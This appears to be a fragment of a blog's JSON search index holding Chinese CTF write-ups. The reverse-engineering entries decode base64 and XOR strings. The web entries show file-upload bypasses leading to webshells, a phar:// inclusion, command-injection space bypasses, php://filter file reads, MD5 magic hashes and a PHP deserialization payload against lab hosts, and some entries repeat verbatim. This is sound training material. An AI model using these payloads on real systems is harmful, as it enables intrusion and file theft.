\"5Mc58bPHLiAx7J8ocJIlaVUxaJvMcoYMaoPMaOfg15c475tscHfM/8==\" #str1是要解密的代码 string1 = \"qvEJAfHmUYjBac+u8Ph5n9Od17FrICL/X0gVtM4Qk6T2z3wNSsyoebilxWKGZpRD\" #string1是改过之后的base64表 string2 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" print (base64.b64decode(str1.translate(str.maketrans(string1,string2)))) ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:11","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#hubuctf-2022-新生赛simple_re"},{"categories":["reverse","wp"],"content":"\r[MoeCTF 2022]Hex\r","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:12","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#moectf-2022hex"},{"categories":["reverse","wp"],"content":"\r[HNCTF 2022 Week1]贝斯是什么乐器啊？\rpython脚本： from base64 import * enc = \"TlJRQFBBdTs4alsrKFI6MjgwNi5p\" str = b64decode(enc).decode() for i in range(len(str)): print(chr(i + ord(str[i])),end='') NSSCTF{B@se64_HAHAHA} ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:13","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#hnctf-2022-week1贝斯是什么乐器啊"},{"categories":["reverse","wp"],"content":"\r[SWPUCTF 2021 新生赛]astJS一个xor加密 使用 npm 包 escodegen 解密 安装 escodegen npm i escodegen -g ​ 2.将json 文件转换成 js语句 $ esgenerate 附件.json (function () { function bE(str, key) { var arr = str.split(''); return arr.map(i =\u003e { return String.fromCharCode(i.charCodeAt() ^ key); }).join(''); } console.log(bE('EXXH_Mpjx\\x7FBxYnjggrM~eerv', 11)); }()); ​ 3.执行语句即可获得 flag $ node Welcome to Node.js v14.13.1. Type \".help\" for more information. \u003e (function () { ... function bE(str, key) { ..... var arr = str.split(''); ..... return arr.map(i =\u003e { ....... return String.fromCharCode(i.charCodeAt() ^ key); ....... }).join(''); ..... } ... console.log(bE('EXXH_Mpjx\\x7FBxYnjggrM~eerv', 11)); ... }()); NSSCTF{astIsReallyFunny} ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:14","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#swpuctf-2021-新生赛astjs"},{"categories":["web"],"content":"几道web基础题目wp ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:0","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#"},{"categories":["web"],"content":"\r[SWPUCTF 2021 新生赛]easyupload2.0\r几个常用的姿势试过了，PHP，Php行不通，最后改成phtml，成功上传 最后蚁剑，成功连接 【复盘】查看upload.php \u003c?php session_start(); echo \" \u003cmeta charset=\\\"utf-8\\\"\u003e\"; if(!isset($_SESSION['user'])){ $_SESSION['user'] = md5((string)time() . (string)rand(100, 1000)); } if(isset($_FILES['uploaded'])) { $target_path = \"./upload\"; $t_path = $target_path . \"/\" . basename($_FILES['uploaded']['name']); $uploaded_name = $_FILES['uploaded']['name']; $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name,'.') + 1); $uploaded_size = $_FILES['uploaded']['size']; $uploaded_tmp = $_FILES['uploaded']['tmp_name']; if(preg_match(\"/php|hta|ini/i\", $uploaded_ext)) { die(\"php是不行滴\"); } else { $content = file_get_contents($uploaded_tmp); move_uploaded_file($uploaded_tmp, $t_path); echo \"{$t_path} succesfully uploaded!\"; } } else { die(\"不传🐎还想要f1ag?\"); } ?\u003e ​ 发现用正则表达过滤了php.hta/ini ​ 同时，php3，php5，pht，phtml，phps都是php可运行的文件扩展名 ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:1","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#swpuctf-2021-新生赛easyupload20"},{"categories":["web"],"content":"\r[SWPUCTF 2021 新生赛]easyupload3.0\r看赛题标签，提示了.htaccess，果断png+.htaccess组合 ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:2","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#swpuctf-2021-新生赛easyupload30"},{"categories":["web"],"content":"\r[NISACTF 2022]babyuploadF12发现有目录，进行访问后下载得到upload源码，进行代码审计 @app.route('/upload', methods=['POST']) def upload(): if 'file' not in request.files: return redirect('/') file = request.files['file'] if \".\" in file.filename: return \"Bad filename!\", 403 conn = db() cur = conn.cursor() uid = uuid.uuid4().hex try: cur.execute(\"insert into files (id, path) values (?, ?)\", (uid, file.filename,)) except sqlite3.IntegrityError: return \"Duplicate file\" conn.commit() file.save('uploads/' + file.filename) return redirect('/file/' + uid) 可知，若上传的文件中包含“.”，则会返回Bad filename!，那我们上传一个没有后缀的文件 @app.route('/upload', methods=['POST']) def upload(): if 'file' not in request.files: return redirect('/') file = request.files['file'] if \".\" in file.filename: return \"Bad filename!\", 403 conn = db() cur = conn.cursor() uid = uuid.uuid4().hex try: cur.execute(\"insert into files (id, path) values (?, ?)\", (uid, file.filename,)) except sqlite3.IntegrityError: return \"Duplicate file\" conn.commit() file.save('uploads/' + file.filename) return redirect('/file/' + uid) @app.route('/file/\u003cid\u003e') def file(id): conn = db() cur = conn.cursor() cur.execute(\"select path from files where id=?\", (id,)) res = cur.fetchone() if res is None: return \"File not found\", 404 # print(res[0]) with open(os.path.join(\"uploads/\", res[0]), \"r\") as f: return f.read() 上传后生成一个uuid，并将uuid和文件名存入数据库中，并返回文件的uuid。再通过/file/uuid访问文件，通过查询数据库得到对应文件名，在文件名前拼接uploads/后读取该路径下上传的文件。 绝对路径拼接漏洞 ​ os.path.join(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。 ​ 然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径 当上传的文件名为 /flag ，上传后通过uuid访问文件后，查询到的文件名是 /flag ，那么进行路径拼接时，uploads/ 将被删除，读取到的就是根目录下的 flag 文件。 ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:3","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#nisactf-2022babyupload"},{"categories":["web"],"content":"\r[NISACTF 2022]bingdundun~题目提示可以上传压缩包，关于phar://伪协议，ChatGPT给出了这样的 Phar:// 是 PHP 中的一个伪协议，用于访问 Phar （PHP Archive）文件，Phar 是一种类似于 Zip 的文件格式，用于将多个 PHP 文件打包成一个文件，并可以像一个普通的 PHP 文件一样使用。 主要是用于在php中对压缩文件格式的读取。这种方式通常是用来配合文件上传漏洞使用，或者进行进阶的phar反序列化攻击 用法就是把一句话木马压缩成zip格式，shell.php -\u003e shell.zip，然后再上传到服务器（后续通过前端页面上传也没有问题，通常服务器不会限制上传 zip 文件），再访问：?filename=phar://…/shell.zip/shell.php 原文链接：https://blog.csdn.net/YangYubo091699/article/details/127351065 所以，上传a.zip(a.php一句话木马)， 根据首页给的提示，构造payload http://1.14.71.254:28403/?bingdundun=phar://6d3604f6ad66f035685c8e4caa342aea.zip/a 随后在蚁剑连接，并在根目录发现了flag ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:4","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#nisactf-2022bingdundun"},{"categories":["web"],"content":"\r[SWPUCTF 2021 新生赛]jicaophp代码审计 ​ 分析代码可知，需要用get方法传进一个json，以及通过post方法传入一个id ​ 构造数据包如下： ​ 回显得到flag ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:5","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#swpuctf-2021-新生赛jicao"},{"categories":["web"],"content":"\r[SWPUCTF 2021 新生赛]easy_md5\r进行代码审计，要求name和password的值不同，同时要求两者的md相同，然而进行判断是用的是\"==“符号，这是php的弱类型比较 法一：可以使用带0e开头的数字串进行参数传递，因为PHP会将0e开头的数字转化为0，故此时md5值相等，二来能够给变量的值不相等。 法二：可以传递数组，如name[]=123，password[]=456，md5不能加密数组，故两个md5返回的都是null ​ （另：若遇到===这样的强类型比较，方法一就失效了，方法二仍然有效，或者还可以使用软件fastcoll进行md5碰撞，生成两个字符串使得他们的md5值相同） ​ 另：0e开头的数字 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a 0e545993274517709034328855841020 240610708 0e462097431906509019562988736854 314282422 使用bp发包，得到flag ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:6","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#image-20230228182602104httpsscofield-1313710994cosap-beijingmyqcloudcomimage-20230228182602104pngswpuctf-2021-新生赛easy_md5"},{"categories":["web"],"content":"\r[SWPUCTF 2021 新生赛]Do_you_know_http\r根据页面反馈信息，以及题目描述提示，进行抓包修改user-agent并添加xff，在返回信息中，得到location 访问a.php 再次发包，发现新站点 访问后得到flag ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:7","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#swpuctf-2021-新生赛do_you_know_http"},{"categories":["web"],"content":"\r[SWPUCTF 2021 新生赛]babyrce\r根据题目提示推测，应该跟cookie有关 抓包修改cookie的值，发包后发现新站点： \u003c?php error_reporting(0); highlight_file(__FILE__); error_reporting(0); if (isset($_GET['url'])) { $ip=$_GET['url']; if(preg_match(\"/ /\", $ip)){ die('nonono'); } $a = shell_exec($ip); echo $a; } ?\u003e nonono ​ 从代码层面来看，屏蔽了空格（ ），所以要采取手段来绕过对空格的屏蔽，如果传入的url值不包含空格，则通过函数 **$a = shell_exec($ip);**进行远程rce 在过滤了空格的系统中，以cat flag.txt为例，系统不允许我们输入空格或输入后被过滤。 ${IFS} 可使用${IFS}代替空格。 cat${IFS}flag.txt cat$IFS$1flag.txt cat${IFS}$1flag.txt 先查看根目录，发现疑似文件 随后使用tac或cat读取文件，得到flag ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:8","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#swpuctf-2021-新生赛babyrce"},{"categories":["web"],"content":"\r[第五空间 2021]WebFTP\r​ F12发现用户名为admin，尝试爆破弱口令，可惜没爆破出来，扫描网站后台，发现有.git文件，使用githacker进行扒取，这里复习一下githacker的用法，功能上是比githack要强大的。 ​ 进入到Githacker文件夹执行__init__.py格式如下： ┌──(root㉿kali)-[/home/kali/githacker/GitHacker] └─# python __init__.py --url http://1.14.71.254:28784/.git/ --output-folder result ​ 扒取到的相关文件会输出到该目录下result文件夹中，查看readme.md文档，发现初始账号和密码 ​ 进去之后，好像没啥卵用，phpinfo.php文件在目录var/www/html中，但发现无法在ftp里面直接打开。 ​ 直接访问http://1.14.71.254:28306/.phpinfo.php就可以了 ​ 我觉得倒是做了许多无用功，复盘时返现直接dirsearch返回的结果中除了.git，也包含了README.md文件以及phpinfo.php都可以直接访问，在phpinfo页面搜索flag直接出。 ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:9","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#第五空间-2021webftp"},{"categories":["web"],"content":"\r[SWPUCTF 2021 新生赛]include​ 进入环境，提示传入一个文件，此外并没有发现什么有效信息，dirsearch扫描后台目录，也没啥有效信息，尝试php伪协议 ​ 构造payload进行get传参：http://1.14.71.254:28956/?file=flag 发现有include_once函数 include_once()：在脚本执行期间包含并运行指定文件。该函数和include 函数类似，两者唯一的区别是 使用该函数的时候，php会加检查指定文件是否已经被包含过，如果是，则不会再被包含。 于是利用伪协议构造，得到经过base64编码的flag http://1.14.71.254:28956/?file=php://filter/convert.base64-encode/resource=flag.php 至于为什么要使用base64进行编码输出 常见的php伪协议 1）file:// 访问本地文件系统 2）http:// 访问HTTP(S)网址 3）ftp:// 访问FTP(S)URL 4)php:// 访问各个输出输入流 5)zlib:// 处理压缩流 6)data:// 读取数据 7)glob:// 查找匹配的文件路径模式 8)phar:// PHP归档 9)rar:// RAR数据压缩 至于为什么要使用base64编码，ChatGPT给出了这样的回答： 为了将目标文件内容以文本形式传输给攻击者，攻击者通常会将目标文件内容进行编码，例如使用Base64编码。这是因为HTTP协议只能传输文本数据，对于二进制数据，如图片、音频和视频等，需要进行编码才能在HTTP请求和响应中传输。 在这种情况下，攻击者可以将目标文件内容进行Base64编码，然后将编码后的结果作为HTTP请求或响应的一部分，从而实现传输。在接收到响应后，攻击者可以将编码后的结果解码，从而获得原始的二进制数据，即目标文件的内容。 (我们读取的是flag.php，而并非.txt文件) 引用一下头秃的bug师傅在CSDN的笔记： 过滤器的分类（及常见过滤器）： string filter(字符过滤器) string.rot13 (对字符串执行 ROT13 转换) 例：php://filter/string.rot13/resource=flag.php string.toupper (转大写) 例：php://filter/string.toupper/resource=flag.php string.tolower (转小写) string.strip_tags (去除 HTML 和 PHP 标记，尝试返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果) 例：php://filter/string.strip_tags/resource=flag.php conversion filter (转换过滤器) convert.base64-encode \u0026 convert.base64-decode (base64加密 base64解密) 例：php://filter/convert.base64-encode/resource=flag.php convert.quoted-printable-encode \u0026 convert.quoted-printable-decode(在字符串后加=0A,及恢复) compression filter(压缩过滤) zlib.deflate \u0026 zlib.inflate(压缩 解压) 例：php://filter/zlib.deflate/resource=flag.php php://filter/zlib.inflate/resource=flag.php bzip2.compress \u0026 bzip2.decompress(zip 压缩 解压) encryption filter(加密过滤器) 摘自：https://blog.csdn.net/L2329794714/article/details/121288668 ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:10","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#swpuctf-2021-新生赛include"},{"categories":["web"],"content":"\r[SWPUCTF 2021 新生赛]easyrce灰常简单的rce， 在phpinfo中未发现flag，随后构造： http://1.14.71.254:28678/?url=system(\"ls /); http://1.14.71.254:28678/?url=system(%22tac%20/flllllaaaaaaggggggg%22); 得到flag ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:11","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#swpuctf-2021-新生赛easyrce"},{"categories":["web"],"content":"\r[SWPUCTF 2021 新生赛]ez_unserialize\r没啥有效信息，扫描一下后台，发现 进入c145s.php，得到源代码 经典php反序列化，ChatGPT讲的很明确了 禁用错误报告。error_reporting(0); 可以禁用 PHP 的错误报告，以确保攻击者无法通过错误信息来了解代码的运行情况。 显示 cl45s.php 的源代码。show_source(\"cl45s.php\"); 用于将 cl45s.php 的源代码显示在页面上，这可以帮助攻击者更好地了解代码的运行情况和漏洞点。 定义 wllm 类。这个类具有两个公共属性 $admin 和 $passwd，分别用于存储用户名和密码。类中定义了两个方法，一个是构造函数 __construct()，用于初始化 $admin 和 $passwd 的值；另一个是析构函数 __destruct()，当对象被销毁时执行。 处理传入的参数。$p = $_GET['p']; 用于获取 URL 参数中名为 p 的值。 反序列化。unserialize($p); 将传入的参数 $p 进行反序列化处理，即将字符串转换为 PHP 对象。 调用析构函数。由于在反序列化时会调用对象的构造函数，因此在对象被销毁时会自动调用析构函数 __destruct()。在析构函数中，如果 $admin 的值为 \"admin\"，$passwd 的值为 \"ctf\"，则会包含一个名为 flag.php 的文件，并将其中的 $flag 变量输出到页面上。否则，会将 $admin 和 $passwd 的值输出到页面上，并输出一条提示信息。 传入以下参数得到flag http://1.14.71.254:28814/cl45s.php?p=O:4:%22wllm%22:2:{s:5:%22admin%22;s:5:%22admin%22;s:6:%22passwd%22;s:3:%22ctf%22;} [复习php反序列化] 什么是反序列化漏洞当程序在进行反序列化时，会自动调用一些函数，例如__wakeup(),__destruct()等函数，但是如果传入函数的参数可以被用户控制的话，用户可以输入一些恶意代码到函数中，从而导致反序列化漏洞。 PHP魔术方法魔术方法是PHP面向对象中特有的特性。它们在特定的情况下被触发，都是以双下划线开头，利用魔术方法可以轻松实现PHP面向对象中重载（Overloading即动态创建类属性和方法）。 问题就出现在重载过程中，执行了相关代码。 以下是一些常见的php魔术方法： 1、__get、__set 这两个方法是为在类和他们的父类中没有声明的属性而设计的 __get( $property ) 当调用一个未定义的属性时访问此方法 __set( $property, $value ) 给一个未定义的属性赋值时调用 这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性） 2、__isset、__unset __isset( $property ) 当在一个未定义的属性上调用isset()函数时调用此方法 __unset( $property ) 当在一个未定义的属性上调用unset()函数时调用此方法 与__get方法和__set方法相同，这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性） 3、__call __call( $method, $arg_array ) 当调用一个未定义(包括没有权限访问)的方法是调用此方法 4、__autoload __autoload 函数，使用尚未被定义的类时自动调用。通过此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。 注意: 在 __autoload 函数中抛出的异常不能被 catch 语句块捕获并导致致命错误。 5、__construct、__destruct __construct 构造方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称 __destruct 析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法 默认情况下,PHP仅仅释放对象属性所占用的内存并销毁对象相关的资源.，析构函数允许你在使用一个对象之后执行任意代码来清除内存，当PHP决定你的脚本不再与对象相关时，析构函数将被调用. 在一个函数的命名空间内，这会发生在函数return的时候，对于全局变量，这发生于脚本结束的时候，如果你想明确地销毁一个对象，你可以给指向该对象的变量分配任何其它值，通常将变量赋值勤为NULL或者调用unset。 6、__clone PHP5中的对象赋值是使用的引用赋值，使用clone方法复制一个对象时，对象会自动调用__clone魔术方法，如果在对象复制需要执行某些初始化操作，可以在__clone方法实现。 7、__toString __toString方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时，如果类没有实现此方法，则无法通过echo打印对象，否则会显示：Catchable fatal error: Object of class test could not be converted to string in，此方法必须返回一个字符串。 在PHP 5.2.0之前，__toString方法只有结合使用echo() 或 print()时 才能生效。PHP 5.2.0之后，则可以在任何字符串环境生效（例如通过printf()，使用%s修饰符），但 不能用于非字符串环境（如使用%d修饰符） 从PHP 5.2.0，如果将一个未定义__toString方法的对象 转换为字符串，会报出一个E_RECOVERABLE_ERROR错误。 8、__sleep、__wakeup __sleep 串行化的时候用 __wakeup 反串行化的时候调用 serialize() 检查类中是否有魔术名称 __sleep 的函数。如果这样，该函数将在任何序列化之前运行。它可以清除对象并应该返回一个包含有该对象中应被序列化的所有变量名的数组。 使用 __sleep 的目的是关闭对象可能具有的任何数据库连接，提交等待中的数据或进行类似的清除任务。此外，如果有非常大的对象而并不需要完全储存下来时此函数也很有用。 相反地，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。 9、__set_state 当调用var_export()时，这个静态 方法会被调用（自PHP 5.1.0起有效）。本方法的唯一参数是一个数组，其中包含按array(’property’ =\u003e value, …)格式排列的类属性。 10、__invoke 当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用。PHP5.3.0以上版本有效 11、__callStatic 它的工作方式类似于 __call() 魔术方法，__callStatic() 是为了处理静态方法调用，PHP5.3.0以上版本有效，PHP 确实加强了对 __callStatic() 方法的定义；它必须是公共的，并且必须被声明为静态的。 同样，__call() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此。 ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:12","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#swpuctf-2021-新生赛ez_unserialize"},{"categories":["web"],"content":"\r[SWPUCTF 2021 新生赛]ez_unserialize\r没啥有效信息，扫描一下后台，发现 进入c145s.php，得到源代码 经典php反序列化，ChatGPT讲的很明确了 禁用错误报告。error_reporting(0); 可以禁用 PHP 的错误报告，以确保攻击者无法通过错误信息来了解代码的运行情况。 显示 cl45s.php 的源代码。show_source(\"cl45s.php\"); 用于将 cl45s.php 的源代码显示在页面上，这可以帮助攻击者更好地了解代码的运行情况和漏洞点。 定义 wllm 类。这个类具有两个公共属性 $admin 和 $passwd，分别用于存储用户名和密码。类中定义了两个方法，一个是构造函数 __construct()，用于初始化 $admin 和 $passwd 的值；另一个是析构函数 __destruct()，当对象被销毁时执行。 处理传入的参数。$p = $_GET['p']; 用于获取 URL 参数中名为 p 的值。 反序列化。unserialize($p); 将传入的参数 $p 进行反序列化处理，即将字符串转换为 PHP 对象。 调用析构函数。由于在反序列化时会调用对象的构造函数，因此在对象被销毁时会自动调用析构函数 __destruct()。在析构函数中，如果 $admin 的值为 \"admin\"，$passwd 的值为 \"ctf\"，则会包含一个名为 flag.php 的文件，并将其中的 $flag 变量输出到页面上。否则，会将 $admin 和 $passwd 的值输出到页面上，并输出一条提示信息。 传入以下参数得到flag http://1.14.71.254:28814/cl45s.php?p=O:4:%22wllm%22:2:{s:5:%22admin%22;s:5:%22admin%22;s:6:%22passwd%22;s:3:%22ctf%22;} [复习php反序列化] 什么是反序列化漏洞当程序在进行反序列化时，会自动调用一些函数，例如__wakeup(),__destruct()等函数，但是如果传入函数的参数可以被用户控制的话，用户可以输入一些恶意代码到函数中，从而导致反序列化漏洞。 PHP魔术方法魔术方法是PHP面向对象中特有的特性。它们在特定的情况下被触发，都是以双下划线开头，利用魔术方法可以轻松实现PHP面向对象中重载（Overloading即动态创建类属性和方法）。 问题就出现在重载过程中，执行了相关代码。 以下是一些常见的php魔术方法： 1、__get、__set 这两个方法是为在类和他们的父类中没有声明的属性而设计的 __get( $property ) 当调用一个未定义的属性时访问此方法 __set( $property, $value ) 给一个未定义的属性赋值时调用 这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性） 2、__isset、__unset __isset( $property ) 当在一个未定义的属性上调用isset()函数时调用此方法 __unset( $property ) 当在一个未定义的属性上调用unset()函数时调用此方法 与__get方法和__set方法相同，这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性） 3、__call __call( $method, $arg_array ) 当调用一个未定义(包括没有权限访问)的方法是调用此方法 4、__autoload __autoload 函数，使用尚未被定义的类时自动调用。通过此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。 注意: 在 __autoload 函数中抛出的异常不能被 catch 语句块捕获并导致致命错误。 5、__construct、__destruct __construct 构造方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称 __destruct 析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法 默认情况下,PHP仅仅释放对象属性所占用的内存并销毁对象相关的资源.，析构函数允许你在使用一个对象之后执行任意代码来清除内存，当PHP决定你的脚本不再与对象相关时，析构函数将被调用. 在一个函数的命名空间内，这会发生在函数return的时候，对于全局变量，这发生于脚本结束的时候，如果你想明确地销毁一个对象，你可以给指向该对象的变量分配任何其它值，通常将变量赋值勤为NULL或者调用unset。 6、__clone PHP5中的对象赋值是使用的引用赋值，使用clone方法复制一个对象时，对象会自动调用__clone魔术方法，如果在对象复制需要执行某些初始化操作，可以在__clone方法实现。 7、__toString __toString方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时，如果类没有实现此方法，则无法通过echo打印对象，否则会显示：Catchable fatal error: Object of class test could not be converted to string in，此方法必须返回一个字符串。 在PHP 5.2.0之前，__toString方法只有结合使用echo() 或 print()时 才能生效。PHP 5.2.0之后，则可以在任何字符串环境生效（例如通过printf()，使用%s修饰符），但 不能用于非字符串环境（如使用%d修饰符） 从PHP 5.2.0，如果将一个未定义__toString方法的对象 转换为字符串，会报出一个E_RECOVERABLE_ERROR错误。 8、__sleep、__wakeup __sleep 串行化的时候用 __wakeup 反串行化的时候调用 serialize() 检查类中是否有魔术名称 __sleep 的函数。如果这样，该函数将在任何序列化之前运行。它可以清除对象并应该返回一个包含有该对象中应被序列化的所有变量名的数组。 使用 __sleep 的目的是关闭对象可能具有的任何数据库连接，提交等待中的数据或进行类似的清除任务。此外，如果有非常大的对象而并不需要完全储存下来时此函数也很有用。 相反地，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。 9、__set_state 当调用var_export()时，这个静态 方法会被调用（自PHP 5.1.0起有效）。本方法的唯一参数是一个数组，其中包含按array(’property’ =\u003e value, …)格式排列的类属性。 10、__invoke 当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用。PHP5.3.0以上版本有效 11、__callStatic 它的工作方式类似于 __call() 魔术方法，__callStatic() 是为了处理静态方法调用，PHP5.3.0以上版本有效，PHP 确实加强了对 __callStatic() 方法的定义；它必须是公共的，并且必须被声明为静态的。 同样，__call() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此。 ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:12","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#什么是反序列化漏洞"},{"categories":["web"],"content":"\r[SWPUCTF 2021 新生赛]ez_unserialize\r没啥有效信息，扫描一下后台，发现 进入c145s.php，得到源代码 经典php反序列化，ChatGPT讲的很明确了 禁用错误报告。error_reporting(0); 可以禁用 PHP 的错误报告，以确保攻击者无法通过错误信息来了解代码的运行情况。 显示 cl45s.php 的源代码。show_source(\"cl45s.php\"); 用于将 cl45s.php 的源代码显示在页面上，这可以帮助攻击者更好地了解代码的运行情况和漏洞点。 定义 wllm 类。这个类具有两个公共属性 $admin 和 $passwd，分别用于存储用户名和密码。类中定义了两个方法，一个是构造函数 __construct()，用于初始化 $admin 和 $passwd 的值；另一个是析构函数 __destruct()，当对象被销毁时执行。 处理传入的参数。$p = $_GET['p']; 用于获取 URL 参数中名为 p 的值。 反序列化。unserialize($p); 将传入的参数 $p 进行反序列化处理，即将字符串转换为 PHP 对象。 调用析构函数。由于在反序列化时会调用对象的构造函数，因此在对象被销毁时会自动调用析构函数 __destruct()。在析构函数中，如果 $admin 的值为 \"admin\"，$passwd 的值为 \"ctf\"，则会包含一个名为 flag.php 的文件，并将其中的 $flag 变量输出到页面上。否则，会将 $admin 和 $passwd 的值输出到页面上，并输出一条提示信息。 传入以下参数得到flag http://1.14.71.254:28814/cl45s.php?p=O:4:%22wllm%22:2:{s:5:%22admin%22;s:5:%22admin%22;s:6:%22passwd%22;s:3:%22ctf%22;} [复习php反序列化] 什么是反序列化漏洞当程序在进行反序列化时，会自动调用一些函数，例如__wakeup(),__destruct()等函数，但是如果传入函数的参数可以被用户控制的话，用户可以输入一些恶意代码到函数中，从而导致反序列化漏洞。 PHP魔术方法魔术方法是PHP面向对象中特有的特性。它们在特定的情况下被触发，都是以双下划线开头，利用魔术方法可以轻松实现PHP面向对象中重载（Overloading即动态创建类属性和方法）。 问题就出现在重载过程中，执行了相关代码。 以下是一些常见的php魔术方法： 1、__get、__set 这两个方法是为在类和他们的父类中没有声明的属性而设计的 __get( $property ) 当调用一个未定义的属性时访问此方法 __set( $property, $value ) 给一个未定义的属性赋值时调用 这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性） 2、__isset、__unset __isset( $property ) 当在一个未定义的属性上调用isset()函数时调用此方法 __unset( $property ) 当在一个未定义的属性上调用unset()函数时调用此方法 与__get方法和__set方法相同，这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性） 3、__call __call( $method, $arg_array ) 当调用一个未定义(包括没有权限访问)的方法是调用此方法 4、__autoload __autoload 函数，使用尚未被定义的类时自动调用。通过此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。 注意: 在 __autoload 函数中抛出的异常不能被 catch 语句块捕获并导致致命错误。 5、__construct、__destruct __construct 构造方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称 __destruct 析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法 